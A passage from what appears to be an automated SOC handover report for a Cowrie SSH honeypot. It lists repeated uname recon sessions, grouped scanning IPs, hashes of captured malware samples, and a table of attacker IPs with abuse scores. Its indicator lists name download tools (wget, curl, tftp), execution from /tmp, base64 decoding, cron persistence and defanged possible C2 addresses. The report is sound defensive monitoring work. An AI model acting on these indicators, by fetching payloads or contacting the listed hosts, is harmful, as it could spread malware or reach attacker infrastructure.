| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:28:03` | `cowrie.session.connect` |
| `2026-09-05 18:28:03` | `cowrie.client.version` |
| `2026-09-05 18:28:03` | `cowrie.client.kex` |
| `2026-09-05 18:28:03` | `cowrie.login.success` |
| `2026-09-05 18:28:04` | `cowrie.session.params` |
| `2026-09-05 18:28:04` | `cowrie.command.input` |
| `2026-09-05 18:28:04` | `cowrie.log.closed` |
| `2026-09-05 18:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d988fa41c05e

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:28 |
| **Last Seen** | 2026-09-05 18:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:28:18` | `cowrie.session.connect` |
| `2026-09-05 18:28:18` | `cowrie.client.version` |
| `2026-09-05 18:28:18` | `cowrie.client.kex` |
| `2026-09-05 18:28:18` | `cowrie.login.success` |
| `2026-09-05 18:28:18` | `cowrie.session.params` |
| `2026-09-05 18:28:18` | `cowrie.command.input` |
| `2026-09-05 18:28:18` | `cowrie.log.closed` |
| `2026-09-05 18:28:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5188913f8d36

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:28 |
| **Last Seen** | 2026-09-05 18:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:28:32` | `cowrie.session.connect` |
| `2026-09-05 18:28:32` | `cowrie.client.version` |
| `2026-09-05 18:28:32` | `cowrie.client.kex` |
| `2026-09-05 18:28:32` | `cowrie.login.success` |
| `2026-09-05 18:28:33` | `cowrie.session.params` |
| `2026-09-05 18:28:33` | `cowrie.command.input` |
| `2026-09-05 18:28:33` | `cowrie.log.closed` |
| `2026-09-05 18:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e36e48ec3ab7

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:28 |
| **Last Seen** | 2026-09-05 18:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:28:47` | `cowrie.session.connect` |
| `2026-09-05 18:28:47` | `cowrie.client.version` |
| `2026-09-05 18:28:47` | `cowrie.client.kex` |
| `2026-09-05 18:28:47` | `cowrie.login.success` |
| `2026-09-05 18:28:48` | `cowrie.session.params` |
| `2026-09-05 18:28:48` | `cowrie.command.input` |
| `2026-09-05 18:28:48` | `cowrie.log.closed` |
| `2026-09-05 18:28:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b876a38a6591

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:29 |
| **Last Seen** | 2026-09-05 18:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:29:02` | `cowrie.session.connect` |
| `2026-09-05 18:29:02` | `cowrie.client.version` |
| `2026-09-05 18:29:02` | `cowrie.client.kex` |
| `2026-09-05 18:29:02` | `cowrie.login.success` |
| `2026-09-05 18:29:02` | `cowrie.session.params` |
| `2026-09-05 18:29:02` | `cowrie.command.input` |
| `2026-09-05 18:29:03` | `cowrie.log.closed` |
| `2026-09-05 18:29:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0c1cf36f3e7

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:29 |
| **Last Seen** | 2026-09-05 18:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:29:17` | `cowrie.session.connect` |
| `2026-09-05 18:29:17` | `cowrie.client.version` |
| `2026-09-05 18:29:17` | `cowrie.client.kex` |
| `2026-09-05 18:29:17` | `cowrie.login.success` |
| `2026-09-05 18:29:17` | `cowrie.session.params` |
| `2026-09-05 18:29:17` | `cowrie.command.input` |
| `2026-09-05 18:29:17` | `cowrie.log.closed` |
| `2026-09-05 18:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acde1d11af7c

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:29 |
| **Last Seen** | 2026-09-05 18:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:29:31` | `cowrie.session.connect` |
| `2026-09-05 18:29:31` | `cowrie.client.version` |
| `2026-09-05 18:29:31` | `cowrie.client.kex` |
| `2026-09-05 18:29:31` | `cowrie.login.success` |
| `2026-09-05 18:29:32` | `cowrie.session.params` |
| `2026-09-05 18:29:32` | `cowrie.command.input` |
| `2026-09-05 18:29:32` | `cowrie.log.closed` |
| `2026-09-05 18:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c18ecff34652

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:29 |
| **Last Seen** | 2026-09-05 18:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:29:47` | `cowrie.session.connect` |
| `2026-09-05 18:29:47` | `cowrie.client.version` |
| `2026-09-05 18:29:47` | `cowrie.client.kex` |
| `2026-09-05 18:29:47` | `cowrie.login.success` |
| `2026-09-05 18:29:47` | `cowrie.session.params` |
| `2026-09-05 18:29:47` | `cowrie.command.input` |
| `2026-09-05 18:29:47` | `cowrie.log.closed` |
| `2026-09-05 18:29:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `92.204.138[.]142` | **41** | 2026-09-05 14:55 | 2026-09-05 18:05 | 21m | 0 | `T1592` | 🟠 MEDIUM |
| `51.158.205[.]203` | **6** | 2026-09-05 16:58 | 2026-09-05 17:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `217.60.255[.]130` | **5** | 2026-09-05 15:08 | 2026-09-05 18:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.90.12[.]122` | **4** | 2026-09-05 16:34 | 2026-09-05 17:56 | 4m | 0 | `T1592` | 🟢 LOW |
| `136.116.129[.]132` | **3** | 2026-09-05 17:45 | 2026-09-05 18:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]168` | **3** | 2026-09-05 16:29 | 2026-09-05 17:46 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `31.42.164[.]33` | **3** | 2026-09-05 17:16 | 2026-09-05 17:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `76.95.224[.]18` | **3** | 2026-09-05 16:54 | 2026-09-05 16:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `86.54.31[.]34` | **3** | 2026-09-05 15:28 | 2026-09-05 15:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | **2** | 2026-09-05 16:29 | 2026-09-05 17:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-09-05 17:16 | 2026-09-05 18:12 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-09-05 15:36 | 2026-09-05 15:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.107.171[.]235` | **2** | 2026-09-05 17:47 | 2026-09-05 17:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.55.77[.]88` | **2** | 2026-09-05 15:25 | 2026-09-05 15:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `40.124.179[.]11` | **2** | 2026-09-05 17:26 | 2026-09-05 17:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]204` | 1 | 2026-09-05 15:21 | 2026-09-05 15:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `116.255.159[.]152` | 1 | 2026-09-05 16:21 | 2026-09-05 16:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.227.152[.]171` | 1 | 2026-09-05 17:56 | 2026-09-05 17:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.56.11[.]51` | 1 | 2026-09-05 18:33 | 2026-09-05 18:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-09-05 15:13 | 2026-09-05 15:13 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.159[.]154` | 1 | 2026-09-05 17:52 | 2026-09-05 17:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `159.223.174[.]116` | 1 | 2026-09-05 17:25 | 2026-09-05 17:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.93.245[.]203` | 1 | 2026-09-05 16:14 | 2026-09-05 16:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-09-05 15:58 | 2026-09-05 15:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.19.27[.]156` | 1 | 2026-09-05 15:50 | 2026-09-05 15:50 | 13s | 0 | `T1592` | 🟢 LOW |
| `200.54.212[.]162` | 1 | 2026-09-05 15:11 | 2026-09-05 15:11 | 11s | 0 | `T1592` | 🟢 LOW |
| `45.189.108[.]138` | 1 | 2026-09-05 15:40 | 2026-09-05 15:40 | 10s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-09-05 15:37 | 2026-09-05 15:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]253` | 1 | 2026-09-05 16:02 | 2026-09-05 16:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-09-05 17:15 | 2026-09-05 17:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `72.229.136[.]74` | 1 | 2026-09-05 16:10 | 2026-09-05 16:10 | 10s | 0 | `T1592` | 🟢 LOW |
| `77.40.53[.]84` | 1 | 2026-09-05 16:16 | 2026-09-05 16:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]42` | 1 | 2026-09-05 18:37 | 2026-09-05 18:37 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `45.79.115[.]134` | US | Linode | **100** ⚠️ | 50 |
| `165.1.75[.]106` | US | Oracle Corporation | **100** ⚠️ | 2 |
| `139.19.117[.]129` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 0 |
| `180.93.245[.]203` | VN | Saigon Postel Corporation | **100** ⚠️ | 0 |
| `45.177.147[.]146` | AR | NETLATIN S.R.L. | **100** ⚠️ | 0 |
| `200.54.212[.]162` | CL | CTC. CORP S.A. (TELEFONICA EMPRESAS) | **100** ⚠️ | 3 |
| `103.213.238[.]91` | BD | Inspire Broadband | **100** ⚠️ | 50 |
| `177.30.68[.]202` | BR | TIM S/A | **100** ⚠️ | 5 |
| `193.90.12[.]122` | NO | GLOBALCONNECT AS | **100** ⚠️ | 50 |
| `51.158.205[.]203` | NL | Scaleway - Amsterdam, Netherlands | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 353 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 328 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 22 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 20 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 20 |

---

## 🔕 False Positive Summary (33 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 8 |
| AbuseIPDB score 15 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 19 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 461 cases |
| Tool 34  | Credential Extractor        | ✅ 355 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 16 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 71 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 33 filtered (7.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 36 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 327 priority case(s) shown individually · 33 recon entry/entries in table (15 group(s) consolidating 83 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
